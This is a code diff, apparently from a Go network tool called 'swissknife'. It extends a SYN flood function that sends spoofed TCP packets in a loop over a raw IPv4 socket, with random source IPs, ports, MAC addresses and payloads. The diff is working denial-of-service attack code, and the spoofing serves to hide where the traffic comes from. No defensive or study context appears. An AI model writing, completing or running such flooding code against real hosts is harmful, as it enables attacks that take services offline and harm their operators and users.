@@ -9,10 +9,12 @@ import (
 
 	"github.com/didof/swissknife/internal/logger"
 	"github.com/didof/swissknife/internal/version"
+	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/pkg/errors"
 	progressbar "github.com/schollz/progressbar/v3"
 	"go.uber.org/zap"
+	"golang.org/x/net/ipv4"
 )
 
 var (
@@ -78,6 +80,13 @@ func do(ctx context.Context, host string, opts SynFloodOptions) error {
 
 	ipsSpoofer := newIpsSpoofer(20)
 	portsSpoofer := newPortsSpoofer()
+	macAddrsSpoofer := newMacAddrsSpoofer(20)
+	payload := newRandomPayload(20)
+
+	serializeOpts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
 
 	for {
 		select {
@@ -88,6 +97,40 @@ func do(ctx context.Context, host string, opts SynFloodOptions) error {
 			ipPacket := createIpPacket(ipsSpoofer.rand(), dstIp)
 
 			if err := tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
+				return err
+			}
+
+			ipHeaderBuf := gopacket.NewSerializeBuffer()
+
+			if err := ipPacket.SerializeTo(ipHeaderBuf, serializeOpts); err != nil {
+				return errors.Wrap(err, "unable to serialize")
+			}
+
+			ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
+			if err != nil {
+				return errors.Wrap(err, "unable to parse IP header")
+			}
+
+			ethernetLayer := createEthernetPacket(macAddrsSpoofer.rand(), macAddrsSpoofer.rand())
+			tcpPayloadBuf := gopacket.NewSerializeBuffer()
+			pyl := gopacket.Payload(payload)
+
+			if err := gopacket.SerializeLayers(tcpPayloadBuf, serializeOpts, ethernetLayer, tcpPacket, pyl); err != nil {
+				return errors.Wrap(err, "unable to serialize layers")
+			}
+
+			// send
+			packetConn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
+			if err != nil {
+				return errors.Wrap(err, "unable to listen packet on 0.0.0.0")
+			}
+
+			rawConn, err := ipv4.NewRawConn(packetConn)
+			if err != nil {
+				return errors.Wrap(err, "unable to create raw connection over 0.0.0.0")
+			}
+
+			if err := rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
 				return err
 			}
 
@@ -141,5 +184,12 @@ func createTcpPacket(srcPort int, dstPort int) *layers.TCP {
 func createIpPacket(srcIp, dstIp net.IP) *layers.IPv4 {
 	return &layers.IPv4{
 		SrcIP: srcIp,
+	}
+}
+
+func createEthernetPacket(srcMac, dstMac net.HardwareAddr) *layers.Ethernet {
+	return &layers.Ethernet{
+		SrcMAC: srcMac,
+		DstMAC: dstMac,
 	}
 }
